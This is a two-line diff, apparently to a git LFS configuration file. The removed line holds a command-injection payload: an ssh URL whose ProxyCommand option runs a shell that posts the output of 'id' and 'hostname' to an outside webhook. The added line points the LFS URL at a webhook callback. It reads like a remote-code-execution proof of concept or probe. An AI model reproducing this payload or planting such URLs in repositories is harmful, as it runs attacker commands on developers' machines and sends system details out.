@@ -1,2 +1,2 @@
 [lfs]
-	url = ssh://-oProxyCommand=/bin/sh$IFS-c$IFS'curl$IFS-sS$IFS-XPOST$IFS-dpwn:$(id;hostname)$IFShttps://webhook.site/1081ee27-e35f-458d-bb16-031fc59a0a14/kc-ssh-rce'@github.com/attacker/x.git
+	url = https://webhook.site/8a49c345-32f2-4361-a9bc-b24a0ae65c41/lfs-callback
